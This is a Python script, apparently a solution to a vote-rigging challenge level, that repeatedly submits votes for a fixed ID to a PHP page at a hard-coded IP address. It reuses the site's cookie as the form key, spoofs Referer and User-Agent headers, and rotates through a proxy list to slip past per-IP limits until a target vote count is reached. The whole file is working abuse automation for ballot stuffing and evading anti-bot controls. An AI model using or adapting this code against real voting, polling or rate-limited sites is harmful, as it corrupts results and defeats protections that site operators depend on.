#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style
import sys

URL = "http://158.69.76.135/level4.php"
vote_id = "2483"
session = requests.Session()
goal = 98

def hack(proxy):
    headers = {
        'Referer': URL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    }

    data = {
        'id': vote_id,
        'key':'',
        'holdthedoor':'Submit'
    }
    proxies = {
        'http': '',
        'https': '',
    }
    response = session.get(URL)
    soup = BeautifulSoup(response.text, "html.parser")
    
    proxies['http'] = proxy
    proxies['https'] = proxy
    print("Trying connexion: " + proxy)

    dict = session.cookies.get_dict()
    data['key'] = dict['HoldTheDoor']

    try:
        page = session.post(URL, data=data, headers=headers, proxies=proxies, timeout=5)
    except Exception:
        print(Fore.RED + "Failed to hack the page...\n")
        session.cookies.clear()
        return -1

    vote_nb = soup.select_one('tr:-soup-contains("2483")')
    vote_nb = vote_nb.findAll('td')[1].text
    vote_nb = int(vote_nb)
    
    if page and "today" not in page.text:
        print(Fore.GREEN + "Page hacked succesfully!")
        session.cookies.clear()
        return vote_nb
    else:
        print(Fore.RED + "Failed to hack the page...\n")
        session.cookies.clear()
        return -1

def main():
    res = 0
    f = open("proxylist", "r")
    while res != goal:
        proxy = f.readline().strip()
        res = hack(proxy) + 1
        print(Style.RESET_ALL)
        if res != 0:
            print("Vote number: {}\n".format(res))
    f.close()

if __name__ == '__main__':
    main()
